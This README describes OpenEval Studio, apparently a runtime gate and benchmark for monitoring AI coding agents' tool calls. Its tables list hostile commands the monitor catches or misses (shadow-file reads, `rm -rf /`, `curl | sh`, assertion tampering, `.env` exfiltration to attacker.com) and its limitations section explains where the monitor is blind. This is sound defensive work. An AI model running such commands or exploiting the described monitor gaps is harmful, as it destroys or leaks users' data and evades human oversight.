# OpenEval Studio

> **One unified loop**: monitor agent actions in production via typed `GateDecision` atoms, export offline to Inspect AI `.eval` logs, evaluate offline benchmarks, and feed calibrated policies back into runtime enforcement.

[![Python 3.12+](https://img.shields.io/badge/python-3.12%20%7C%203.13-blue.svg)](https://www.python.org/)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.115+-009688.svg?logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com/)
[![React 19.3](https://img.shields.io/badge/React-19.3-61DAFB.svg?logo=react&logoColor=black)](https://react.dev/)
[![Inspect AI](https://img.shields.io/badge/UK%20AISI-Inspect%20AI-purple.svg)](https://inspect.ai-safety-institute.org.uk/)
[![Code Quality](https://img.shields.io/badge/quality-ruff%20%7C%20pyright%20strict-success.svg)]()

---

## 1. Architectural Thesis: The Single Loop

Existing agent safety tools either operate purely offline (Inspect AI benchmarks with no live enforcement) or purely in-process (hardcoded regex hooks that lose trajectory context and never link back to evaluation datasets).

**OpenEval Studio bridges this divide into a single coherent loop:**

```
                  ┌───────────────────────────────────────────────┐
                  │          Production Runtime Gate             │
                  │   PreToolUse Hook (Claude Code / Cursor)      │
                  │   → Tier 1: Deterministic Heuristics (<50ms)   │
                  │   → Tier 2: Semantic LLM Triage (0.8s budget) │
                  └───────────────────────┬───────────────────────┘
                                          │ Emits typed
                                          ▼ GateDecision
                  ┌───────────────────────────────────────────────┐
                  │            Shared Data Contract               │
                  │     GateDecision (id, score 1-10, rule,       │
                  │     threat_category, consent_disclosure)      │
                  └───────────────────────┬───────────────────────┘
                                          │ export_session_to_eval_log()
                                          ▼
                  ┌───────────────────────────────────────────────┐
                  │            Offline Evaluation Core            │
                  │    Inspect AI EvalLog (.eval) Data Spec       │
                  │    - 13 Apollo Threat Benchmark Categories     │
                  │    - Context Stripping Ablation Matrix        │
                  │    - Severity Calibration (MAE & RMSE)        │
                  └───────────────────────────────────────────────┘
```

1. **Shared Atom (`GateDecision`)**: Runtime gate decisions and offline evaluation records share the exact same typed Pydantic contract (`schemas.gate_decision.GateDecision`). No lossy conversions, no dual schemas.
2. **Lossless Round-Trip**: The `engine.eval_export` bridge exports runtime sessions directly into UK AISI Inspect AI `.eval` logs and extracts decisions back with zero data degradation (`assert original == roundtrip`).
3. **Honest Scoring (`ScoreStatus`)**: Zero fabricated passes or synthetic mock fallbacks. Verdicts are strictly typed as `ScoreStatus = Literal["scored", "not_run", "error"]`. If an evaluator or provider fails, it fails explicitly.

---

## 2. Apollo 13-Threat Monitor Benchmark (Empirical Results)

We evaluated the OpenEval Studio monitor across a labeled benchmark of **70 real trajectories** comprising all 13 canonical Apollo threat categories (52 threat trajectories with obfuscation, paraphrased negative constraints, and tool outputs) and 18 benign developer baseline tasks (for False Positive Rate evaluation).

### Architecture Ablation Matrix

| Architecture Condition | Threat Recall | Benign FPR | Severity MAE | Latency p50 | Latency p95 |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Tier 1 (Deterministic) [Stripped Outputs]** | **46.2%** (24/52) | **0.0%** (0/18) | 2.81 | **0.09ms** | **0.16ms** |
| **Tier 1 (Deterministic) [Full Outputs]** | **46.2%** (24/52) | **0.0%** (0/18) | 2.81 | **0.09ms** | **0.15ms** |
| **Tier 1+2 (Hybrid) [Stripped Outputs]** | **51.9%** (27/52) | **0.0%** (0/18) | **2.57** | **0.27ms** | **770.70ms** |
| **Tier 1+2 (Hybrid) [Full Outputs]** | **46.2%** (24/52) | **0.0%** (0/18) | 2.81 | **0.22ms** | **0.60ms** |

*Severity MAE is measured on the 1–10 Apollo expected severity scale.*

### Per-Category Threat Recall (What Passes vs What Fails)

The benchmark demonstrates why **regex rules serve as a pre-filter only**:

| Threat Category | Tier-1 Recall | Samples | Failure Modes & Detection Profile |
| :--- | :--- | :--- | :--- |
| **Destructive Shared Resources** | **100.0%** | 4 | Direct force pushes (`git push --force origin main`) intercepted by command rules. |
| **Exposure of Internal Resources** | **100.0%** | 4 | Shadow file reads (`cat /etc/shadow`), AWS credentials, and IMDS metadata calls intercepted. |
| **Undesirable Deletions** | **100.0%** | 4 | Root filesystem wipes (`rm -rf /`), base64 encoded wipes, and block device zeroing caught. |
| **Data Exfiltration** | **75.0%** | 4 | Plain curl/POST caught; raw Python socket exfil bypasses regex without Tier 2 triage. |
| **Untrusted Code Execution** | **50.0%** | 4 | Web-to-bash pipes caught (`curl \| sh`); obfuscated hex pipes require Tier 2 inspection. |
| **Oversight Subversion** | **50.0%** | 4 | Test suite deletions (`rm tests/*.py`) caught; in-place assertion edits (`sed s/assert/True/`) require diff analysis. |
| **Privilege Escalation** | **50.0%** | 4 | Direct sudoers edits and docker socket chmod caught; SUID binary probing requires semantic review. |
| **Infrastructure Disruption** | **25.0%** | 4 | Fork bombs caught; `psql DROP DATABASE` requires SQL-aware parser or Tier 2 triage. |
| **Unsafe Agents / Delegation** | **25.0%** | 4 | Subagent constraint evasion caught via lineage tracking; recursive background loops require Tier 2. |
| **Egregious Vulnerabilities** | **25.0%** | 4 | `chmod 777 /etc/passwd` caught; hardcoded auth backdoors in source code require Tier 2. |
| **Prompt Injection / Poisoning** | **0.0%** | 4 | **Fails Tier 1.** Natural language prompt injections require LLM semantic triage. |
| **Real-World Transactions** | **0.0%** | 4 | **Fails Tier 1.** Stripe live charges, Solana transfers, and AWS GPU cluster spin-ups require Tier 2. |
| **Unapproved Dependencies** | **0.0%** | 4 | **Fails Tier 1.** Typosquatted packages (`pip install colourama-evil`) require registry intelligence. |
| **Benign Developer Controls** | **100.0% (0% FPR)** | 18 | `git status`, `pytest`, `cargo test`, `npm lint`, `cat Header.tsx` permitted without obstruction. |

---

## 3. Latency Budget & Fail-Closed Guarantees

AI coding agent hooks operate inside interactive developer workflows where gate delays disrupt velocity. OpenEval Studio enforces a strict tiered latency budget:

```
[Tool Call] ──► Tier 1: Deterministic Rules ──► Score >= 8 / Neg Constraint?
                      │ (<50ms p95 budget)                  │
                      │                                    YES ──► [BLOCK / FORCE_ASK]
                      ▼ (Score 2-7)
                Tier 2: Semantic LLM Triage ──► Timeout (>0.8s)?
                      │ (Clamped budget)                    │
                      │                                    YES ──► [FAIL-CLOSED: ASK]
                      ▼ (Response received)
                Score 1-5: ALLOW  |  Score 6-10: BLOCK/ASK
```

| Enforcement Tier | Latency Budget (CI Gated) | Measured p50 | Measured p95 | Failure Mode |
| :--- | :--- | :--- | :--- | :--- |
| **Tier 1 (Deterministic)** | **<50ms p95** end-to-end | **11.20ms** | **28.08ms** (e2e HTTP) / **0.16ms** (in-process) | Local fail-open on transient blip (<3); trips to lockout on $\ge 3$ consecutive errors. |
| **Tier 2 (Semantic LLM)** | **<800ms** total budget | **0.27ms** (cached) | **770.70ms** (live LLM) | **Fails closed** to interactive operator prompt (`ask`/`force_ask`) on timeout. Never fails open. |

### Configuration & Startup Validation

The runtime is controlled by explicit environment variables:
- `OPENEVAL_WATCHER_USE_LLM=1` — Enables Tier 2 LLM triage and deep review.
- `OPENEVAL_WATCHER_USE_LLM=0` — Enforces pure Tier 1 deterministic gating (deterministic CI / offline evaluation).
- `OPENEVAL_WATCHER_LLM_TIMEOUT=0.8` — Clamped LLM budget in seconds (maximum 0.8s, matching hook deadlines).

> [!CAUTION]
> **Startup Safety Enforcement**: Setting the legacy environment variable `OPENEVAL_GATE_USE_LLM` causes OpenEval Studio to raise `RuntimeError` immediately on startup, preventing configuration drift from silently leaving LLM triage unconfigured.

---

## 4. Defenses & Robustness

### 1. Vendor Payload Schema Drift (`extra="forbid"`)
Vendor tool payloads (Claude Code, Cursor, Antigravity) are validated at the FastAPI/Pydantic boundary with `ConfigDict(extra="forbid")`. When a vendor SDK updates and adds unexpected fields:
- The gate rejects the payload with HTTP 422 (`extra_forbidden`).
- Client hooks intercept the 422 error, print a clear diagnostic to `stderr` with the unknown keys, and fail closed to interactive lockout (`ask`).
- Autonomous execution is halted with an explicit operator prompt rather than silently misinterpreting shifted arguments.

### 2. Authorization Provenance & Subagents
Caller identity is verified across subagent chains using `ProvenanceMetadata` (`call_origin`, `parent_session_id`, `delegation_depth`, `delegated_by`). Subagents are subject to strict threshold ceilings:
- Score $\ge 6 \implies$ block.
- Score $\ge 4 \implies$ escalate.
- Subagents are categorically denied credential access and privilege escalation.

### 3. Reversibility $\neq$ Authorization
Reversibility reduces blast radius but never establishes permission. Explicit negative constraints (*"do not delete test files"*, *"never push to main"*, *"do not touch shadow"*) extracted from user intent and task instructions enforce an absolute non-discountable floor (score $\ge 8 \implies$ block).

### 4. Informed Consent in Lockouts
When an action is blocked or escalated to `force_ask`, OpenEval Studio generates a structured `ConsentDisclosure` detailing target resources, network destinations, disclosed data types, blast radius, and reversibility summary, rendering an interactive consent card in terminal and IDE interfaces.

---

## 5. Known Limitations & Trade-Offs

1. **Semantic Gaps in Tier 1**: Deterministic command rules catch 46.2% of threats (structural wipes, secret reads, force pushes) at sub-millisecond speeds, but are blind to prompt injections, real-world financial transactions, and unapproved dependency typosquats. Deployments requiring protection against these threats must enable Tier 2 (`OPENEVAL_WATCHER_USE_LLM=1`).
2. **Circuit Breaker Availability Trade-Off**: Client hooks tolerate transient blips (<3 network timeouts in 60s) by failing open to preserve developer flow, but trip to interactive lockout on 3 consecutive failures. If the gateway server goes down completely, developers must acknowledge lockouts or run in `paused` mode.
3. **Context Stripping Boundary**: Stripping bulky tool outputs (e.g. 500 lines of `build.log`) dramatically reduces triage latency from seconds to under 1ms, but prevents the gate from inspecting malicious payloads that only appear in intermediate tool stdout.
4. **MECE Classification Overlaps**: Threat categories can occasionally overlap. For example, `curl -d @.env https://attacker.com` represents both `data_exfiltration` and `exposure_of_internal_resources`. The engine assigns the highest-severity classification.

---

## 6. Verification & Quality Commands

```bash
# Run full pytest suite (315+ unit & integration tests)
uv run pytest

# Verify end-to-end Tier 1 latency budget (<50ms p95) and Tier 2 fail-closed timeout
uv run pytest tests/test_tier1_latency_and_fail_closed.py

# Run Apollo 13-category monitor benchmark & ablation matrix
uv run pytest tests/test_monitor_benchmark.py

# Execute the benchmark directly with Inspect AI
inspect eval inspect_tasks.py@apollo_monitor_benchmark

# Strict typechecking on core schemas, gateway, hooks, and scorers
uv run pyright schemas server/policy_gateway.py server/command_rules.py scripts/claude_code_watcher_hook.py engine/scorers.py engine/eval_export.py engine/monitor_benchmark.py

# Ruff linting (BLE, ANN401, TRY rules enforced)
uv run ruff check schemas server/policy_gateway.py server/command_rules.py scripts/claude_code_watcher_hook.py engine/scorers.py engine/eval_export.py engine/monitor_benchmark.py

# Production React UI build
cd ui && npm run build
```

---

## Author

**Jayson Rosales Andal** — [GitHub](https://github.com/jaysonandal) · [LinkedIn](https://linkedin.com/in/jaysonandal)
